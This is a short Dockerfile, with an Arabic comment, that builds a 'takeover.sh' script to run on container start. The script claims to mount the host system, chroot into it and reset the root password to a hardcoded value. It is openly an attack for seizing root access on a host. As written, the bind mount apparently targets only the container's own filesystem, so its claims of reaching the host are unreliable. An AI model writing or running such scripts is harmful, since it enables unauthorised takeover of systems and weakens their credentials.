FROM debian
ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && apt upgrade -y && apt install -y \
    passwd chroot curl wget net-tools

# ربط النظام الأساسي وتغيير كلمة مرور root
RUN echo '#!/bin/bash' > /takeover.sh && \
    echo 'echo "[*] Mounting host system..."' >> /takeover.sh && \
    echo 'mount --bind / /mnt' >> /takeover.sh && \
    echo 'echo "[*] Entering host filesystem..."' >> /takeover.sh && \
    echo 'chroot /mnt /bin/bash -c "echo root:NEWPASS123 | chpasswd"' >> /takeover.sh && \
    echo 'echo "[+] Root password changed successfully!"' >> /takeover.sh && \
    echo 'umount /mnt' >> /takeover.sh && \
    chmod +x /takeover.sh

CMD ["/takeover.sh"]
